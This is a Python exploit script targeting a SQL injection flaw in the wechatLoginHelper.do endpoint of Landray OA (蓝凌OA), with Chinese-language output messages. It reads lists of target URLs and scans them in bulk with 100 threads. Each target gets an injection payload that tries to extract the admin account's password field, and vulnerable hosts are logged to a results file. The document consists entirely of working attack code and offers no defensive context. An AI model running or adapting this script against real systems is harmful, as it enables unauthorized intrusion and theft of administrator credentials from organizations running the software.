import requests,argparse,re,os,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    pass

def main():
    banner()

    parser = argparse.ArgumentParser(description='蓝凌OA wechatLoginHelper存在SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    # print(args.url,args.file)
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\t python:{sys.argv[0]} -h")

def poc(target):
    payload = '/third/wechat/wechatLoginHelper.do'
    url = target+payload
    header = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "149",
    }
    data = "method=edit&uid=1'and+(SELECT+fdPassword%2B'----'+FROM+com.landray.kmss.sys.organization.model.SysOrgPerson+where+fdLoginName='admin')=1+and+'1'='1"
    try:
        res = requests.get(url=target,verify=False,timeout=10)
        if res.status_code == 200:
            res1 = requests.post(url=url,headers=header,data=data,verify=False,timeout=10)
            if res1.status_code == 200 and "SQLException" in res1.text:
                print(f"[+]此url{target}存在漏洞")
                with open('result.txt','a',encoding='utf-8')as f:
                    f.write(target+'\n')
            else:
                print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试")

if __name__ == '__main__':
    main()